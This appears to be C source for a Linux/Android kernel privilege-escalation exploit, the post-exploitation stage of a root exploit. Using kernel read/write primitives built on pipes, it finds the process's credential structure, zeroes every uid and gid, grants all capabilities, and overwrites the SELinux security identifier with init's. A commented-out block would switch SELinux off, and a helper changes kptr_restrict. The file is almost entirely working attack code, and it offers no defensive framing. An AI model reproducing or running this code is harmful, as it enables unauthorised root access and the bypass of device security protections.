#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <inttypes.h>
#include <errno.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "threadinfo.h"
#include "kallsyms.h"

#define __user
#define __kernel

#define QUOTE(str) #str
#define TOSTR(str) QUOTE(str)
#define ASMMAGIC (0xBEEFDEAD)

int read_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes))
		return 1;

	if(write(pipes[1], address, len) != len)
		goto end;
	if(read(pipes[0], buf, len) != len)
		goto end;

	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

int write_at_address_pipe(void* address, void* buf, ssize_t len)
{
	int ret = 1;
	int pipes[2];

	if(pipe(pipes))
		return 1;

	if(write(pipes[1], buf, len) != len)
		goto end;
	if(read(pipes[0], address, len) != len)
		goto end;

	ret = 0;
end:
	close(pipes[1]);
	close(pipes[0]);
	return ret;
}

inline int writel_at_address_pipe(void* address, unsigned long val)
{
	return write_at_address_pipe(address, &val, sizeof(val));
}

static bool is_keyring_configed() {
	return kallsyms_exist_sym("keyring_read");
}

#define KALLSYMS_RESTRICT "/proc/sys/kernel/kptr_restrict"

static int set_kallsyms_restrict(int state) {
	FILE *fd = fopen(KALLSYMS_RESTRICT, "w");
	int ret = -1;
    if(fd == NULL) {
    	printf("open failed, ppid:%d, gid:%d,%s\n",getppid(), getgid(),strerror(errno));
        return ret;
    }

    if (state == 0)
    	if (fwrite("0", 1, 1, fd) != 1)
    		goto fail;
    else if(state == 1)
    	if (fwrite("2", 1, 1,fd) != 1)
    		goto fail;

    ret = 0;

fail:	    
	printf("set kall syms restrict ret:%d\n", ret);
	fclose(fd);
	return ret;
}

static struct task_security_struct init_tss;

static unsigned int get_init_sid(void* info, int cred_offset) {
	unsigned int pid;
	unsigned int tgid;
	unsigned int ppid;
	unsigned int par_offset;
	unsigned int pid_offset;
	struct cred* __kernel cred = NULL;

	unsigned int buff[0x100];
	unsigned int buff2[0x100];


	pid = syscall(__NR_gettid);
	tgid = getpgid(pid);
	ppid = getppid();
	unsigned int ptgid = getpgid(ppid);

	if(read_at_address_pipe(info, &buff, 0x400)) {
		return 0;
	}

	for(pid_offset=0; pid_offset < 0x100; pid_offset++) {
		if(buff[pid_offset] == pid && buff[pid_offset + 1]==tgid) {
			par_offset = pid_offset + 3;
			do {
				if (buff[par_offset] > KERNEL_START && !(buff[par_offset] & 0x3)) {
					if (read_at_address_pipe(buff[par_offset], &buff2, 0x400)) {
						return 0;
					}
					if (buff2[pid_offset] == ppid) {
						break;
					}
				}
				par_offset++;
			}while((par_offset - pid_offset) <=4);

			if (par_offset - pid_offset > 4) {
				return 0;
			}


			while (ppid != 1) {
				if (read_at_address_pipe(buff2[par_offset], &buff2, 0x400)) {
					return 0;
				}
				ppid = buff2[pid_offset];
			}

			struct task_security_struct* __kernel security = NULL;
			cred = buff2[cred_offset/4];
			read_at_address_pipe(&cred->security, &security, sizeof(security));
			if ((unsigned long)security < KERNEL_START) 
				read_at_address_pipe(0x10 + &cred->security, &security, sizeof(security));

			if ((unsigned long)security > KERNEL_START) {
				if(read_at_address_pipe(security, &init_tss, sizeof(init_tss)))
					return 0;
				return init_tss.sid;
			}
		}
	}
	return 0;
}

int modify_task_cred_uc(struct thread_info* __kernel info)
{
	unsigned int i;
	unsigned long val;
	unsigned int cred_offset;
	struct cred* __kernel cred = NULL;
	struct thread_info ti;
	struct task_security_struct* __kernel security = NULL;
	struct task_struct_partial* __user tsp;

	if(read_at_address_pipe(info, &ti, sizeof(ti)))
		return 1;

	tsp = malloc(sizeof(*tsp));
	if (!tsp)
		return -ENOMEM;

	for(i = 0; i < 0x600; i+= sizeof(void*))
	{
		struct task_struct_partial* __kernel t = (struct task_struct_partial*)((void*)ti.task + i);
		if(read_at_address_pipe(t, tsp, sizeof(*tsp)))
			break;

		if (is_cpu_timer_valid(&tsp->cpu_timers[0])
			&& is_cpu_timer_valid(&tsp->cpu_timers[1])
			&& is_cpu_timer_valid(&tsp->cpu_timers[2])
			&& tsp->real_cred == tsp->cred)
		{
			cred = tsp->cred;
			break;
		}
	}
	cred_offset = i + offsetof(struct task_struct_partial, cred);
	free(tsp);
	if(cred == NULL)
		return 1;

	val = 0;
	write_at_address_pipe(&cred->uid, &val, sizeof(cred->uid));
	write_at_address_pipe(&cred->gid, &val, sizeof(cred->gid));
	write_at_address_pipe(&cred->suid, &val, sizeof(cred->suid));
	write_at_address_pipe(&cred->sgid, &val, sizeof(cred->sgid));
	write_at_address_pipe(&cred->euid, &val, sizeof(cred->euid));
	write_at_address_pipe(&cred->egid, &val, sizeof(cred->egid));
	write_at_address_pipe(&cred->fsuid, &val, sizeof(cred->fsuid));
	write_at_address_pipe(&cred->fsgid, &val, sizeof(cred->fsgid));

	val = -1;
	write_at_address_pipe(&cred->cap_inheritable.cap[0], &val, sizeof(cred->cap_inheritable.cap[0]));
	write_at_address_pipe(&cred->cap_inheritable.cap[1], &val, sizeof(cred->cap_inheritable.cap[1]));
	write_at_address_pipe(&cred->cap_permitted.cap[0], &val, sizeof(cred->cap_permitted.cap[0]));
	write_at_address_pipe(&cred->cap_permitted.cap[1], &val, sizeof(cred->cap_permitted.cap[1]));
	write_at_address_pipe(&cred->cap_effective.cap[0], &val, sizeof(cred->cap_effective.cap[0]));
	write_at_address_pipe(&cred->cap_effective.cap[1], &val, sizeof(cred->cap_effective.cap[1]));
	write_at_address_pipe(&cred->cap_bset.cap[0], &val, sizeof(cred->cap_bset.cap[0]));
	write_at_address_pipe(&cred->cap_bset.cap[1], &val, sizeof(cred->cap_bset.cap[1]));

	// if (!is_selinux()) {
	// 	return 0;
	// }

	read_at_address_pipe(&cred->security, &security, sizeof(security));
	// if ((unsigned long)security < KERNEL_START) 
	// 	read_at_address_pipe(0x10 + &cred->security, &security, sizeof(security));

	if ((unsigned long)security > KERNEL_START) 
	{
		struct task_security_struct tss;
		if(read_at_address_pipe(security, &tss, sizeof(tss)))
			goto end;

		if (tss.osid != 0
			&& tss.sid != 0
			&& tss.exec_sid == 0
			&& tss.create_sid == 0
			&& tss.keycreate_sid == 0
			&& tss.sockcreate_sid == 0)
		{
			printf("get init sid\n");
			unsigned int sid = get_init_sid(ti.task, cred_offset);
			printf("get init sid:\n", sid);
			if(!sid) 
				sid = 1;

			write_at_address_pipe(&security->osid, &sid, sizeof(security->osid));
			write_at_address_pipe(&security->sid, &sid, sizeof(security->sid));
		}
	}

	// set_kallsyms_restrict(0);
	// {
	// 	int zero = 0;
	// 	int selinux_enabled = kallsyms_get_symbol_address("selinux_enabled");
	// 	int selinux_enforcing = kallsyms_get_symbol_address("selinux_enforcing");
	// 	printf("%x,%x\n", selinux_enabled, selinux_enforcing );
	// 	if(selinux_enabled)
	// 		write_at_address_pipe(selinux_enabled, &zero, sizeof(zero));
	// 	if(selinux_enforcing)
	// 		write_at_address_pipe(selinux_enforcing, &zero, sizeof(zero));
	// }
	// set_kallsyms_restrict(1);
end:
	return 0;
}
